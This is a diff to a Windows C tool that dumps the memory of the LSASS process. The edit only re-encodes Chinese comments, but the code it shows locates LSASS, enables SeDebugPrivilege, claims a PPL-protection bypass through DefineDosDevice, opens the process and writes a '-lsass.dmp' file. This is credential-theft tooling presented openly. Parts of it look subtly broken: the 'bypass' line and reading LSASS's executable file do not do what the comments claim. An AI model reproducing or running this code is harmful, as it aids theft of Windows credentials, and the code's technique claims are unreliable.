@@ -8,7 +8,7 @@
 
 int _tmain(int argc, TCHAR* argv[])
 {
-	// »ñÈ¡Lsass½ø³ÌID
+	// 获取Lsass进程ID
 	DWORD dwLsassPID = 0;
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnap == INVALID_HANDLE_VALUE)
@@ -36,7 +36,7 @@ int _tmain(int argc, TCHAR* argv[])
 	}
 
 
-	// ¿ªÆôSeDebugPrivilege
+	// 开启SeDebugPrivilege
 	HANDLE hToken;
 	TOKEN_PRIVILEGES TokenPrivileges;
 	BOOL bResult;
@@ -66,10 +66,10 @@ int _tmain(int argc, TCHAR* argv[])
 	}
 
 
-	// ÈÆ¹ýPPL±£»¤
+	// 绕过PPL保护
 	DefineDosDevice(DDD_RAW_TARGET_PATH, _T("LSASS"), _T("\\Device\\LSASS"));
 
-	// ´ò¿ªLSASS½ø³Ì¾ä±ú
+	// 打开LSASS进程句柄
 	HANDLE hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, dwLsassPID);
 	if (hLsass == NULL)
 	{
@@ -77,12 +77,12 @@ int _tmain(int argc, TCHAR* argv[])
 		return 1;
 	}
 
-	// »ñÈ¡LSASS½ø³ÌµÄ¾ä±úÎÄ¼þÃû
+	// 获取LSASS进程的句柄文件名
 	TCHAR szFileName[MAX_PATH];
 	DWORD dwSize = MAX_PATH;
 	QueryFullProcessImageName(hLsass, 0, szFileName, &dwSize);
 
-	// ´ò¿ªLSASS½ø³Ì¾ä±ú
+	// 打开LSASS进程句柄
 	HANDLE hLsassFile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 
 	if (hLsassFile == INVALID_HANDLE_VALUE)
@@ -96,7 +96,7 @@ int _tmain(int argc, TCHAR* argv[])
 		return 1;
 	}
 
-	// µ¼³öLsass½ø³ÌÄÚ´æ
+	// 导出Lsass进程内存
 	_stprintf_s(szFileName, MAX_PATH, _T("%s-lsass.dmp"), argv[0]);
 
 	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
